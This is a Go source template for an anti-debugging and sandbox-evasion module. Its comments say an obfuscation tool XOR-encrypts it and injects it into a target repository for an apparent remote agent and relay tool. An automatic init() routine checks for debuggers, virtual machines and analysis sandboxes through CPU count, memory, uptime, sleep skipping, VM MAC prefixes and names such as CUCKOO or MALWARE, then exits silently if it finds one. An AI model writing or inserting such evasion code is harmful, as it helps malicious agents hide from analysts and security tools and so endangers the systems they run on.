// Template file for the anti-debug evasion package (Windows variant).
// This is NOT compiled — it's embedded into the obfuscation tool as a string
// and written to the target repo during -antidebug phase.
// The strings here are in plaintext; the XOR obfuscation phase (which runs
// first) will encrypt them. Do NOT add build tags or package declarations here.

package evasion

import (
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procIsDebuggerPresent    = kernel32.NewProc("IsDebuggerPresent")
	procCheckRemoteDebugger  = kernel32.NewProc("CheckRemoteDebuggerPresent")
	procGlobalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
	procGetTickCount64       = kernel32.NewProc("GetTickCount64")
)

type memoryStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

func checkDebugger() bool {
	ret, _, _ := procIsDebuggerPresent.Call()
	if ret != 0 {
		return true
	}
	var remote int32
	procCheckRemoteDebugger.Call(0, uintptr(unsafe.Pointer(&remote)))
	return remote != 0
}

func checkVMSandbox() bool {
	if runtime.NumCPU() < 2 {
		return true
	}

	var memInfo memoryStatusEx
	memInfo.dwLength = uint32(unsafe.Sizeof(memInfo))
	ret, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memInfo)))
	if ret != 0 && memInfo.ullTotalPhys < 2*1024*1024*1024 {
		return true
	}

	uptime, _, _ := procGetTickCount64.Call()
	if uptime < 10*60*1000 {
		return true
	}

	start := time.Now()
	time.Sleep(2 * time.Second)
	if time.Since(start) < 1500*time.Millisecond {
		return true
	}

	vmMACs := []string{"00:0c:29", "00:50:56", "08:00:27", "00:15:5d", "52:54:00", "00:1c:42"}
	interfaces, err := netInterfaces()
	if err == nil {
		for _, mac := range interfaces {
			for _, prefix := range vmMACs {
				if strings.HasPrefix(mac, prefix) {
					return true
				}
			}
		}
	}

	sandboxEnvKeys := []string{"SANDBOX", "VBOX", "CUCKOO", "ANALYSIS", "MALWARE", "SAMPLE", "VIRUS"}
	for _, key := range sandboxEnvKeys {
		for _, env := range os.Environ() {
			if strings.HasPrefix(env, key+"=") || strings.Contains(env, "="+key) {
				return true
			}
		}
	}

	username := strings.ToLower(os.Getenv("USERNAME"))
	sandboxUsers := []string{"sandbox", "malware", "cuckoo", "user", "analysis", "sample", "virus"}
	for _, su := range sandboxUsers {
		if username == su {
			return true
		}
	}

	return false
}

func checkEnvironment() bool {
	if checkDebugger() {
		return false
	}
	if checkVMSandbox() {
		return false
	}
	return true
}

func init() {
	// Skip evasion checks for server mode — the server runs on trusted
	// infrastructure (VPS, home server) and may legitimately be in a VM.
	// Only apply evasion for connect (agent) and relay modes.
	if len(os.Args) > 1 && os.Args[1] == "serve" {
		return
	}
	if !checkEnvironment() {
		os.Exit(0)
	}
}